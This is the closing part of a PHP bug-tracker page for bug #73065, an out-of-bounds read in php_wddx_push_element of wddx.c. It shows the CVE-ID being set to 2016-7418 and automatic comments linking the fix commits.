<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-7418</span>
</div></div></div><div class='comment type_svn' ><a name="1476698894">&nbsp;</a><strong>[2016-10-17 10:08 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_svn' ><a name="1476698902">&nbsp;</a><strong>[2016-10-17 10:08 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
